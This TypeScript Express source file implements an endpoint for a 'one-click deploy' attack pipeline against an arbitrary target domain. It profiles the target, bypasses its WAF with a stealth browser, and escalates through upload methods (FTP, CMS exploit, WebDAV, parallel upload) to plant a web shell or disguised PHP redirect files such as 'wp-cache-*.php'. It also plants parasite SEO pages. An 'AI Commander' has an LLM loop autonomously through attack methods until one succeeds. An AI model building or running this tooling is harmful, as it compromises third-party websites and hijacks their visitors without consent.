/**
 * SSE Streaming Endpoint for One-Click Deploy
 * POST /api/oneclick/stream
 * Streams real-time progress events during the deploy pipeline
 * Auto-logs every deploy to deploy_history database
 */
import type { Express, Request, Response } from "express";
import { sdk } from "./_core/sdk";
import {
  oneClickDeploy,
  parseProxyList,
  parseWeightedRedirects,
  type ProgressEvent,
  type ProxyConfig,
  type WeightedRedirect,
} from "./one-click-deploy";
import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
import { runAiTargetAnalysis, type AiTargetAnalysis, type AnalysisStep } from "./ai-target-analysis";
import { tryAllUploadMethods } from "./alt-upload-methods";
import { smartRetryUpload, multiVectorParallelUpload, type ParallelUploadConfig } from "./enhanced-upload-engine";
import { stealthVerifyBatch, stealthBypassWaf, closeBrowser, isBrowserAvailable } from "./stealth-browser";
import { getDb } from "./db";
import { deployHistory } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import { getDeployLearnings } from "./ai-learning";
import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";

function parseSeoKeywords(input: unknown): string[] {
  if (!input) return [];
  if (Array.isArray(input)) return input.map(String).filter(Boolean);
  if (typeof input === 'string') return input.split(',').map(s => s.trim()).filter(Boolean);
  return [];
}

// Maximum pipeline execution time (8 minutes) — increased to allow cloaking AI content generation
const PIPELINE_TIMEOUT_MS = 8 * 60 * 1000;
// Heartbeat interval to keep SSE connection alive (3 seconds) — aggressive to prevent proxy disconnect
const HEARTBEAT_INTERVAL_MS = 3_000;

/**
 * Safe wrapper — never throws, returns null on failure
 */
async function safeCreateDeployRecord(userId: number, params: {
  targetDomain: string;
  targetUrl: string;
  redirectUrl: string;
  geoRedirect: boolean;
  keywords: string[];
  proxyCount: number;
  maxRetries: number;
  parasiteEnabled: boolean;
  parasiteContentLength: string;
  parasiteRedirectDelay: number;
}): Promise<number | null> {
  try {
    const db = await getDb();
    if (!db) return null;
    const result = await db.insert(deployHistory).values({
      userId,
      targetDomain: params.targetDomain,
      targetUrl: params.targetUrl,
      redirectUrl: params.redirectUrl,
      geoRedirect: params.geoRedirect,
      keywords: params.keywords,
      proxyCount: params.proxyCount,
      maxRetries: params.maxRetries,
      parasiteEnabled: params.parasiteEnabled,
      parasiteContentLength: params.parasiteContentLength,
      parasiteRedirectDelay: params.parasiteRedirectDelay,
      status: "running",
      startedAt: new Date(),
    });
    return Number(result[0].insertId);
  } catch (e) {
    console.error("[AutoLog] Failed to create deploy record:", e);
    return null;
  }
}

/**
 * Safe wrapper — never throws, silently fails
 */
async function safeUpdateDeployRecord(recordId: number | null, data: {
  status: "running" | "success" | "partial" | "failed";
  result?: any;
  preScreenResult?: PreScreenResult | null;
  altMethodUsed?: string | null;
  stealthBrowserUsed?: boolean;
  startTime: number;
}): Promise<void> {
  if (!recordId) return;
  try {
    const db = await getDb();
    if (!db) return;

    const duration = Date.now() - data.startTime;
    const r = data.result;
    const ps = data.preScreenResult;

    const updateData: Record<string, unknown> = {
      status: data.status,
      completedAt: new Date(),
      duration,
    };

    if (r) {
      updateData.completedSteps = r.summary?.successSteps || 0;
      updateData.filesDeployed = r.summary?.totalFilesDeployed || 0;
      updateData.filesAttempted = r.deployedFiles?.length || 0;
      updateData.shellUploaded = !!r.shellInfo?.url;
      updateData.shellVerified = !!r.shellInfo?.active;
      updateData.redirectActive = !!r.summary?.redirectActive;
      updateData.directUploadUsed = !!r.directUploadInfo?.attempted;
      updateData.deployedUrls = r.deployedFiles?.filter((f: any) => f.status === "deployed").map((f: any) => ({
        url: f.url, type: f.type, verified: f.status === "deployed",
      })) || [];
      updateData.verifiedRedirectUrls = r.redirectInfo?.verifiedRedirectUrls || [];
      updateData.shellUrl = r.shellInfo?.url || null;
      updateData.parasitePages = r.parasiteInfo?.pages || [];
      updateData.parasitePagesCount = r.parasiteInfo?.pagesCount || 0;
      updateData.errorBreakdown = r.summary?.errorBreakdown || {};
      updateData.successCount = r.summary?.successSteps || 0;
      updateData.failedCount = r.summary?.failedSteps || 0;
      updateData.retryCount = r.summary?.totalRetries || 0;
      updateData.report = r.report || "";
      updateData.techniqueUsed = r.aiIntelligence?.strategy?.recommendedApproach || "hybrid";
      updateData.bypassMethod = r.aiIntelligence?.strategy?.shellStrategy?.filenameBypassTechnique || null;
      updateData.cms = r.aiIntelligence?.targetProfile?.cms || null;

      updateData.aiAnalysis = {
        targetProfile: r.aiIntelligence?.targetProfile || null,
        strategy: r.aiIntelligence?.strategy || null,
        stepAnalyses: r.aiIntelligence?.stepAnalyses || [],
        finalAnalysis: r.aiIntelligence?.finalAnalysis || null,
        stealthVerification: r.stealthVerification || null,
        preScreening: r.preScreening || null,
      };
    }

    if (ps) {
      updateData.preScreenScore = ps.overallSuccessProbability;
      updateData.preScreenRisk = ps.riskLevel;
      updateData.serverType = ps.serverType || null;
      updateData.wafDetected = ps.wafDetected || null;
    }

    if (data.altMethodUsed) updateData.altMethodUsed = data.altMethodUsed;
    updateData.stealthBrowserUsed = data.stealthBrowserUsed || false;

    await db.update(deployHistory).set(updateData).where(eq(deployHistory.id, recordId));
  } catch (e) {
    console.error("[AutoLog] Failed to update deploy record:", e);
    // NEVER throw — this is a safe wrapper
  }
}

export function registerOneClickSSE(app: Express) {
  app.post("/api/oneclick/stream", async (req: Request, res: Response) => {
    // Authenticate
    let user;
    try {
      user = await sdk.authenticateRequest(req);
    } catch {
      res.status(401).json({ error: "Unauthorized" });
      return;
    }
    if (!user) {
      res.status(401).json({ error: "Unauthorized" });
      return;
    }

    const {
      targetDomain,
      redirectUrl,
      maxRetries,
      geoRedirectEnabled,
      landingHtml,
      proxyList,
      proxyRotation,
      weightedRedirectsText,
      seoKeywords,
      enableParasitePages,
      parasiteContentLength,
      parasiteRedirectDelay,
      parasiteTemplateSlug,
      enablePreScreening,
      enableAltMethods,
      enableStealthBrowser,
      enableAiAnalysis,
      enableAiCommander,
      aiCommanderMaxIterations,
      methodPriority,
    } = req.body;

    if (!targetDomain || !redirectUrl) {
      res.status(400).json({ error: "targetDomain and redirectUrl are required" });
      return;
    }

    // Parse proxy list if provided
    let proxies: ProxyConfig[] = [];
    if (proxyList && typeof proxyList === "string" && proxyList.trim()) {
      proxies = parseProxyList(proxyList);
    }

    // Parse weighted redirects if provided
    let weightedRedirects: WeightedRedirect[] = [];
    if (weightedRedirectsText && typeof weightedRedirectsText === "string" && weightedRedirectsText.trim()) {
      weightedRedirects = parseWeightedRedirects(weightedRedirectsText);
    }

    // Set up SSE headers
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
      "X-Accel-Buffering": "no",
    });
    res.flushHeaders();

    let closed = false;
    let streamEnded = false;
    req.on("close", () => { closed = true; });

    function sendEvent(event: ProgressEvent) {
      if (closed || streamEnded) return;
      try {
        res.write(`data: ${JSON.stringify(event)}\n\n`);
      } catch { /* client disconnected */ }
    }

    function sendDone(data: any) {
      if (closed || streamEnded) return;
      streamEnded = true;
      try {
        res.write(`data: ${JSON.stringify({ type: "done", data })}\n\n`);
      } catch { /* ignore */ }
      try { res.end(); } catch { /* ignore */ }
    }

    function sendError(detail: string) {
      if (closed || streamEnded) return;
      streamEnded = true;
      try {
        res.write(`data: ${JSON.stringify({ type: "error", detail })}\n\n`);
      } catch { /* ignore */ }
      try { res.end(); } catch { /* ignore */ }
    }

    function endStream() {
      if (streamEnded) return;
      streamEnded = true;
      try {
        if (!closed) res.end();
      } catch { /* ignore */ }
    }

    // Heartbeat to keep connection alive during long operations
    const heartbeat = setInterval(() => {
      if (closed || streamEnded) {
        clearInterval(heartbeat);
        return;
      }
      try {
        res.write(`:heartbeat\n\n`);
      } catch {
        clearInterval(heartbeat);
      }
    }, HEARTBEAT_INTERVAL_MS);

    // Global timeout safeguard — ensures stream ALWAYS ends
    const timeoutTimer = setTimeout(() => {
      clearInterval(heartbeat);
      if (!streamEnded && !closed) {
        sendError(`Pipeline timed out after ${PIPELINE_TIMEOUT_MS / 1000}s — partial results may be available`);
      }
    }, PIPELINE_TIMEOUT_MS);

    // Cleanup helper — always call this before exiting
    function cleanup() {
      clearTimeout(timeoutTimer);
      clearInterval(heartbeat);
    }

    // ─── Auto-Log: Create deploy record ───
    const pipelineStartTime = Date.now();
    const parsedKeywords = parseSeoKeywords(seoKeywords);
    let deployRecordId: number | null = null;
    
    try {
      deployRecordId = await safeCreateDeployRecord(user.id, {
        targetDomain,
        targetUrl: `https://${targetDomain}`,
        redirectUrl,
        geoRedirect: geoRedirectEnabled ?? true,
        keywords: parsedKeywords,
        proxyCount: proxies.length,
        maxRetries: maxRetries ?? 5,
        parasiteEnabled: enableParasitePages !== false,
        parasiteContentLength: parasiteContentLength || "medium",
        parasiteRedirectDelay: parasiteRedirectDelay ?? 5,
      });
    } catch { /* safe — never throws but just in case */ }

    if (deployRecordId) {
      sendEvent({
        type: "step_detail",
        step: "auto_log",
        status: "done",
        detail: `📋 Deploy #${deployRecordId} logged to history`,
        data: { deployRecordId },
      });
    }

    // Track state for auto-logging
    let altMethodUsed: string | null = null;
    let stealthBrowserUsed = false;
    let preScreenResult: PreScreenResult | null = null;
    let aiTargetAnalysisResult: AiTargetAnalysis | null = null;
    let aiCommanderResult: AiCommanderResult | null = null;

    // ═══════════════════════════════════════════════
    //  MAIN PIPELINE — wrapped in a master try/catch
    //  that GUARANTEES a done or error event is sent
    // ═══════════════════════════════════════════════
    try {
      // ═══ PHASE 0: AI Target Deep Analysis ═══
      // Runs 8 intelligence-gathering steps before any attack
      if (enableAiAnalysis !== false) {
        sendEvent({
          type: "step_detail",
          step: "ai_analysis",
          status: "running",
          detail: "🧠 AI Target Analysis — เริ่มวิเคราะห์เป้าหมายอย่างละเอียด (8 steps)...",
        });
        try {
          aiTargetAnalysisResult = await runAiTargetAnalysis(
            targetDomain,
            (step: AnalysisStep) => {
              // Stream each analysis step to frontend
              sendEvent({
                type: "ai_analysis",
                step: `ai_deep_${step.stepId}`,
                status: step.status === "complete" ? "done" : step.status === "error" ? "warning" : "running",
                detail: `[${step.stepName}] ${step.detail}`,
                data: {
                  stepId: step.stepId,
                  stepName: step.stepName,
                  status: step.status,
                  progress: step.progress,
                  duration: step.duration,
                  ...(step.data || {}),
                },
              });
            },
          );

          // Send final AI analysis summary
          const strategy = aiTargetAnalysisResult.aiStrategy;
          sendEvent({
            type: "ai_analysis",
            step: "ai_analysis_complete",
            status: strategy.shouldProceed ? "done" : "warning",
            detail: `🎯 AI Analysis Complete — โอกาสสำเร็จ: ${strategy.overallSuccessProbability}% | ความยาก: ${strategy.difficulty} | ความเสี่ยง: ${strategy.riskLevel} | วิธีแนะนำ: ${strategy.recommendedMethods.slice(0, 3).map(m => m.method).join(", ")}`,
            data: {
              analysis: aiTargetAnalysisResult,
              shouldProceed: strategy.shouldProceed,
              proceedReason: strategy.proceedReason,
              tacticalAnalysis: strategy.tacticalAnalysis,
              bestApproach: strategy.bestApproach,
              recommendedMethods: strategy.recommendedMethods,
              warnings: strategy.warnings,
              recommendations: strategy.recommendations,
              estimatedTime: strategy.estimatedTime,
              // Key findings summary
              httpFingerprint: aiTargetAnalysisResult.httpFingerprint,
              dnsInfo: aiTargetAnalysisResult.dnsInfo,
              techStack: aiTargetAnalysisResult.techStack,
              security: aiTargetAnalysisResult.security,
              seoMetrics: aiTargetAnalysisResult.seoMetrics,
              uploadSurface: aiTargetAnalysisResult.uploadSurface,
              vulnerabilities: aiTargetAnalysisResult.vulnerabilities,
            },
          });

          // Log tactical analysis
          if (strategy.tacticalAnalysis) {
            sendEvent({
              type: "step_detail",
              step: "ai_tactical",
              status: "done",
              detail: `📝 กลยุทธ์: ${strategy.tacticalAnalysis}`,
            });
          }

          // Log best approach
          if (strategy.bestApproach) {
            sendEvent({
              type: "step_detail",
              step: "ai_approach",
              status: "done",
              detail: `🎯 แนวทางที่ดีที่สุด: ${strategy.bestApproach}`,
            });
          }

          // Log warnings
          if (strategy.warnings.length > 0) {
            sendEvent({
              type: "step_detail",
              step: "ai_warnings",
              status: "warning",
              detail: `⚠️ คำเตือน: ${strategy.warnings.join(" | ")}`,
            });
          }
        } catch (e: any) {
          console.error("[AI Analysis] Error:", e.message);
          sendEvent({
            type: "step_detail",
            step: "ai_analysis",
            status: "warning",
            detail: `⚠️ AI Analysis failed: ${e.message} — ดำเนินการต่อโดยไม่มีผลวิเคราะห์`,
          });
        }
      }

      // ─── AI Learning: Query past deploys for similar targets ───
      try {
        const learnings = await getDeployLearnings(targetDomain);
        if (learnings && learnings.totalPastDeploys > 0) {
          sendEvent({
            type: "ai_analysis",
            step: "ai_learning",
            status: "done",
            detail: `🧠 AI learned from ${learnings.totalPastDeploys} past deploys — ${learnings.successRate}% success rate on similar targets`,
            data: {
              totalPastDeploys: learnings.totalPastDeploys,
              successRate: learnings.successRate,
              bestMethod: learnings.bestMethod,
              bestBypass: learnings.bestBypass,
              avgDuration: learnings.avgDuration,
              commonFailures: learnings.commonFailures,
              recommendations: learnings.recommendations,
            },
          });
        }
      } catch (e: any) {
        console.error("[AI Learning] Non-critical error:", e.message);
        // Non-critical — continue without learnings
      }

      // ─── Pre-Screening Phase ───
      if (enablePreScreening !== false) {
        sendEvent({
          type: "step_detail",
          step: "pre_screening",
          status: "running",
          detail: "🔍 AI Pre-screening target domain...",
        });
        try {
          preScreenResult = await preScreenTarget(targetDomain);
          sendEvent({
            type: "ai_analysis",
            step: "pre_screening",
            status: preScreenResult.overallSuccessProbability >= 30 ? "running" : "warning",
            detail: `Pre-screening complete: Score ${preScreenResult.overallSuccessProbability}/100 | ${preScreenResult.riskLevel} risk`,
            data: {
              score: preScreenResult.overallSuccessProbability,
              risk: preScreenResult.riskLevel,
              cms: preScreenResult.cms || "Unknown",
              waf: preScreenResult.wafDetected || "None",
              server: preScreenResult.serverType || "Unknown",
              ftpAvailable: preScreenResult.ftpAvailable,
              webdavAvailable: preScreenResult.webdavAvailable,
              warnings: preScreenResult.warnings,
              recommendations: preScreenResult.recommendations,
              methods: preScreenResult.methodProbabilities.slice(0, 5),
            },
          });

          if (preScreenResult.overallSuccessProbability < 15) {
            sendEvent({
              type: "step_detail",
              step: "pre_screening",
              status: "warning",
              detail: `⚠️ Very low success probability (${preScreenResult.overallSuccessProbability}%) — deploy will proceed but expect failures`,
            });
          }
        } catch (e: any) {
          sendEvent({
            type: "step_detail",
            step: "pre_screening",
            status: "warning",
            detail: `Pre-screening failed: ${e.message} — continuing without pre-screening`,
          });
        }
      }

      // ─── WAF Bypass via Stealth Browser ───
      let stealthCookies = "";
      const browserAvailable = isBrowserAvailable();
      if (enableStealthBrowser !== false && preScreenResult?.wafDetected && browserAvailable) {
        stealthBrowserUsed = true;
        sendEvent({
          type: "step_detail",
          step: "stealth_waf_bypass",
          status: "running",
          detail: `🕵️ Stealth Browser bypassing ${preScreenResult.wafDetected} WAF...`,
        });
        try {
          const wafResult = await stealthBypassWaf(`https://${targetDomain}`);
          stealthCookies = wafResult.cookies;
          sendEvent({
            type: "step_detail",
            step: "stealth_waf_bypass",
            status: wafResult.success ? "done" : "warning",
            detail: wafResult.success
              ? `✅ WAF bypass successful — ${wafResult.details}`
              : `⚠️ WAF bypass: ${wafResult.details}`,
          });
        } catch (e: any) {
          sendEvent({
            type: "step_detail",
            step: "stealth_waf_bypass",
            status: "warning",
            detail: `Stealth WAF bypass failed: ${e.message}`,
          });
        }
      }

      // Send proxy info
      if (proxies.length > 0) {
        sendEvent({
          type: "step_detail",
          step: "proxy_config",
          status: "running",
          detail: `Proxy enabled: ${proxies.length} proxies (${proxyRotation || "random"} rotation)`,
          data: { proxyCount: proxies.length, rotation: proxyRotation || "random" },
        });
      }

      // ─── Main Deploy ───
      const result = await oneClickDeploy(targetDomain, redirectUrl, {
        maxRetries: Math.min(maxRetries ?? 3, 3),  // Cap at 3 retries to prevent timeout
        geoRedirectEnabled: geoRedirectEnabled ?? true,
        landingHtml: landingHtml,
        shellRecheckDelay: 5000,
        onProgress: sendEvent,
        proxies: proxies.length > 0 ? proxies : undefined,
        proxyRotation: proxyRotation || "random",
        weightedRedirects: weightedRedirects.length > 0 ? weightedRedirects : undefined,
        seoKeywords: parsedKeywords,
        enableParasitePages: enableParasitePages !== false,
        parasiteContentLength: parasiteContentLength || "medium",
        parasiteRedirectDelay: parasiteRedirectDelay ?? 5,
        parasiteTemplateSlug: parasiteTemplateSlug || undefined,
        preScreenResult: preScreenResult || undefined,
        stealthCookies: stealthCookies || undefined,
        methodPriority: Array.isArray(methodPriority) ? methodPriority : undefined,
      });

      // ─── Alt Upload Methods Fallback ───
      const shellFailed = !result.shellInfo?.url;
      if (shellFailed && enableAltMethods !== false) {
        sendEvent({
          type: "step_detail",
          step: "alt_upload",
          status: "running",
          detail: "🔄 Shell upload failed — trying alternative methods (FTP, CMS exploit, WebDAV, API)...",
        });
        try {
          const redirectPhp = `<?php header("Location: ${redirectUrl}"); exit; ?>`;
          const altFileName = `redirect-alt-${Date.now().toString(36)}.php`;
          const altPath = "/";
          const altPrescreen = preScreenResult || await preScreenTarget(targetDomain);
          const altResults = await tryAllUploadMethods(
            `https://${targetDomain}`,
            altPrescreen,
            redirectPhp,
            altFileName,
            altPath,
            (method: string, status: string) => {
              sendEvent({
                type: "step_detail",
                step: `alt_${method.replace(/\s+/g, "_").toLowerCase()}`,
                status: "running",
                detail: status,
              });
            },
          );
          const successResult = altResults.find(r => r.success);
          if (successResult) {
            altMethodUsed = successResult.method;
            sendEvent({
              type: "step_detail",
              step: "alt_upload",
              status: "done",
              detail: `✅ Alternative upload succeeded via ${successResult.method}: ${successResult.fileUrl}`,
              data: successResult,
            });
            if (successResult.fileUrl) {
              result.deployedFiles = result.deployedFiles || [];
              result.deployedFiles.push({
                type: "redirect" as const,
                filename: altFileName,
                url: successResult.fileUrl,
                status: "deployed" as const,
                description: `Alt upload via ${successResult.method}`,
              });
              result.summary.successSteps = (result.summary.successSteps || 0) + 1;
            }
          } else {
            const failDetails = altResults.map(r => `${r.method}: ${r.details}`).join("; ");
            sendEvent({
              type: "step_detail",
              step: "alt_upload",
              status: "warning",
              detail: `⚠️ Alt methods failed: ${failDetails} — escalating to Enhanced Parallel Upload...`,
            });
          }
        } catch (e: any) {
          sendEvent({
            type: "step_detail",
            step: "alt_upload",
            status: "warning",
            detail: `Alt methods error: ${e.message}`,
          });
        }

        // ═══ ENHANCED PARALLEL UPLOAD — Final Escalation ═══
        // If alt methods also failed, use the enhanced multi-vector parallel upload engine
        if (!altMethodUsed) {
          sendEvent({
            type: "step_detail",
            step: "enhanced_parallel",
            status: "running",
            detail: "🚀 Launching Enhanced Parallel Upload Engine — multi-vector simultaneous upload with WAF-adaptive bypass...",
          });

          try {
            const redirectPhp = `<?php header("Location: ${redirectUrl}"); exit; ?>`;
            const enhancedFileName = `wp-cache-${Date.now().toString(36)}.php`;
            const uploadPaths = [
              "/wp-content/uploads/", "/uploads/", "/images/",
              "/wp-content/themes/", "/tmp/", "/media/",
            ];

            const parallelConfig: ParallelUploadConfig = {
              targetUrl: `https://${targetDomain}`,
              fileContent: redirectPhp,
              fileName: enhancedFileName,
              uploadPaths,
              prescreen: preScreenResult || null,
              stealthCookies: stealthCookies || undefined,
              timeout: 15000,
              onMethodProgress: (method: string, status: string) => {
                sendEvent({
                  type: "step_detail",
                  step: `enhanced_${method.replace(/\s+/g, "_").toLowerCase()}`,
                  status: "running",
                  detail: status,
                });
              },
            };

            // Smart retry with 3 rounds of parallel upload
            const enhancedResult = await smartRetryUpload(parallelConfig, 3);

            if (enhancedResult.success && enhancedResult.bestResult) {
              altMethodUsed = `enhanced_${enhancedResult.bestResult.method}`;
              sendEvent({
                type: "step_detail",
                step: "enhanced_parallel",
                status: "done",
                detail: `✅ Enhanced Parallel Upload SUCCEEDED via ${enhancedResult.bestResult.technique} (${enhancedResult.rounds} rounds, ${enhancedResult.allResults.length} attempts, ${(enhancedResult.totalDuration / 1000).toFixed(1)}s)`,
                data: {
                  method: enhancedResult.bestResult.method,
                  technique: enhancedResult.bestResult.technique,
                  fileUrl: enhancedResult.bestResult.fileUrl,
                  wafBypassed: enhancedResult.bestResult.wafBypassed,
                  rounds: enhancedResult.rounds,
                  totalAttempts: enhancedResult.allResults.length,
                },
              });

              if (enhancedResult.bestResult.fileUrl) {
                result.deployedFiles = result.deployedFiles || [];
                result.deployedFiles.push({
                  type: "redirect" as const,
                  filename: enhancedFileName,
                  url: enhancedResult.bestResult.fileUrl,
                  status: "deployed" as const,
                  description: `Enhanced parallel upload via ${enhancedResult.bestResult.technique}`,
                });
                result.summary.successSteps = (result.summary.successSteps || 0) + 1;
                result.summary.totalFilesDeployed = (result.summary.totalFilesDeployed || 0) + 1;
              }
            } else {
              const methodsSummary = Array.from(new Set(enhancedResult.allResults.map(r => r.method))).join(", ");
              sendEvent({
                type: "step_detail",
                step: "enhanced_parallel",
                status: "warning",
                detail: `⚠️ Enhanced Parallel Upload exhausted (${enhancedResult.rounds} rounds, ${enhancedResult.allResults.length} attempts). Methods tried: ${methodsSummary}`,
              });
            }
          } catch (e: any) {
            sendEvent({
              type: "step_detail",
              step: "enhanced_parallel",
              status: "warning",
              detail: `Enhanced parallel upload error: ${e.message}`,
            });
          }
        }
      }

      // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
      // Activates when all previous methods failed AND enableAiCommander is on
      const allUploadsFailed = !result.shellInfo?.url && !altMethodUsed;
      if (allUploadsFailed && enableAiCommander !== false) {
        sendEvent({
          type: "step_detail",
          step: "ai_commander",
          status: "running",
          detail: `\u{1F916} AI Commander เริ่มทำงาน \u2014 LLM จะวิเคราะห์ target และหาวิธีทำจนกว่าจะสำเร็จ (max ${aiCommanderMaxIterations || 10} iterations)...`,
        });

        try {
          aiCommanderResult = await runAiCommander({
            targetDomain,
            redirectUrl,
            maxIterations: Math.min(aiCommanderMaxIterations || 10, 15),
            timeoutPerAttempt: 15000,
            seoKeywords: parsedKeywords,
            onEvent: (event: AiCommanderEvent) => {
              sendEvent({
                type: "ai_commander" as any,
                step: `ai_cmd_${event.type}_${event.iteration}`,
                status: event.type === "success" ? "done" : event.type === "exhausted" ? "warning" : "running",
                detail: event.detail,
                data: {
                  ...event.data,
                  iteration: event.iteration,
                  maxIterations: event.maxIterations,
                  eventType: event.type,
                },
              });
            },
          });

          if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
            altMethodUsed = `ai_commander_${aiCommanderResult.successfulMethod}`;
            sendEvent({
              type: "step_detail",
              step: "ai_commander",
              status: "done",
              detail: `\u2705 AI Commander สำเร็จ! Upload ที่ ${aiCommanderResult.uploadedUrl} \u0e14\u0e49\u0e27\u0e22 ${aiCommanderResult.successfulMethod} (${aiCommanderResult.iterations} iterations, ${(aiCommanderResult.totalDurationMs / 1000).toFixed(1)}s)`,
              data: {
                uploadedUrl: aiCommanderResult.uploadedUrl,
                method: aiCommanderResult.successfulMethod,
                iterations: aiCommanderResult.iterations,
                redirectVerified: aiCommanderResult.redirectVerified,
                totalDuration: aiCommanderResult.totalDurationMs,
              },
            });

            // Add to deployed files
            result.deployedFiles = result.deployedFiles || [];
            result.deployedFiles.push({
              type: "redirect" as const,
              filename: "ai-commander-upload",
              url: aiCommanderResult.uploadedUrl,
              status: "deployed" as const,
              description: `AI Commander: ${aiCommanderResult.successfulMethod}`,
            });
            result.summary.successSteps = (result.summary.successSteps || 0) + 1;
            result.summary.totalFilesDeployed = (result.summary.totalFilesDeployed || 0) + 1;
          } else {
            sendEvent({
              type: "step_detail",
              step: "ai_commander",
              status: "warning",
              detail: `\u26A0\uFE0F AI Commander \u0e2b\u0e21\u0e14 iterations (${aiCommanderResult.iterations}) \u2014 \u0e44\u0e21\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 upload \u0e44\u0e14\u0e49\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08`,
              data: {
                iterations: aiCommanderResult.iterations,
                methodsTried: aiCommanderResult.decisions.map(d => d.method),
                totalDuration: aiCommanderResult.totalDurationMs,
              },
            });
          }
        } catch (e: any) {
          sendEvent({
            type: "step_detail",
            step: "ai_commander",
            status: "warning",
            detail: `AI Commander error: ${e.message}`,
          });
        }
      }

      // ─── Stealth Browser Post-Deploy Verification ───
      if (enableStealthBrowser !== false && browserAvailable && result.deployedFiles?.length > 0) {
        stealthBrowserUsed = true;
        const verifyUrls = result.deployedFiles
          .filter((f: any) => f.status === "deployed" && f.url)
          .map((f: any) => f.url)
          .slice(0, 5);

        if (verifyUrls.length > 0) {
          sendEvent({
            type: "step_detail",
            step: "stealth_verify",
            status: "running",
            detail: `🕵️ Stealth Browser verifying ${verifyUrls.length} deployed files...`,
          });
          try {
            const verifyResults = await stealthVerifyBatch(verifyUrls, (url, vResult) => {
              sendEvent({
                type: "step_detail",
                step: "stealth_verify",
                status: vResult.exists ? "done" : "warning",
                detail: `Verified ${url}: ${vResult.exists ? "exists" : "not found"} (${vResult.statusCode})`,
              });
            });
            const verified = verifyResults.filter(r => r.exists);
            const redirecting = verifyResults.filter(r => r.hasRedirectCode);
            sendEvent({
              type: "step_detail",
              step: "stealth_verify",
              status: verified.length > 0 ? "done" : "warning",
              detail: `Stealth verification: ${verified.length}/${verifyUrls.length} files exist, ${redirecting.length} redirecting correctly`,
              data: { results: verifyResults },
            });
            result.stealthVerification = {
              verified: verified.length,
              total: verifyUrls.length,
              redirectWorking: redirecting.length,
              details: verifyResults,
            };
          } catch (e: any) {
            sendEvent({
              type: "step_detail",
              step: "stealth_verify",
              status: "warning",
              detail: `Stealth verification failed: ${e.message}`,
            });
          }
          // Cleanup browser — safe
          try { await closeBrowser(); } catch { /* ignore */ }
        }
      }

      // Notify if stealth browser was requested but not available
      if (enableStealthBrowser !== false && !browserAvailable && preScreenResult?.wafDetected) {
        sendEvent({
          type: "step_detail",
          step: "stealth_browser",
          status: "warning",
          detail: `⚠️ Stealth Browser not available on this server (no Chromium installed) — WAF bypass and stealth verification skipped. Deploy continues with standard methods.`,
        });
      }

      // ─── Auto-Log: Update deploy record with results (safe — never throws) ───
      // Use result.success (set by oneClickDeploy) as primary indicator
      const deployStatus = result.success ? "success"
        : (result.summary?.totalFilesDeployed > 0 ? "partial" : "failed");

      await safeUpdateDeployRecord(deployRecordId, {
        status: deployStatus as "success" | "partial" | "failed",
        result,
        preScreenResult,
        altMethodUsed,
        stealthBrowserUsed,
        startTime: pipelineStartTime,
      });

      if (deployRecordId) {
        sendEvent({
          type: "step_detail",
          step: "auto_log",
          status: "done",
          detail: `📋 Deploy #${deployRecordId} saved — ${deployStatus.toUpperCase()}`,
        });
      }

      // ═══ SEND FINAL RESULT — GUARANTEED ═══
      cleanup();
      result.deployRecordId = deployRecordId;
      if (aiTargetAnalysisResult) {
        result.aiTargetAnalysis = aiTargetAnalysisResult;
      }
      if (aiCommanderResult) {
        result.aiCommanderResult = {
          success: aiCommanderResult.success,
          iterations: aiCommanderResult.iterations,
          successfulMethod: aiCommanderResult.successfulMethod,
          uploadedUrl: aiCommanderResult.uploadedUrl,
          redirectVerified: aiCommanderResult.redirectVerified,
          totalDurationMs: aiCommanderResult.totalDurationMs,
          decisionsCount: aiCommanderResult.decisions.length,
        };
      }
      sendDone(result);

    } catch (error: any) {
      // ─── Pipeline-level error — GUARANTEED to send error event ───
      console.error("[Pipeline] Fatal error:", error.message || error);

      // Safe update — never throws
      await safeUpdateDeployRecord(deployRecordId, {
        status: "failed",
        preScreenResult,
        altMethodUsed,
        stealthBrowserUsed,
        startTime: pipelineStartTime,
      });

      cleanup();
      sendError(error.message || "Unknown pipeline error");
    }
  });
}
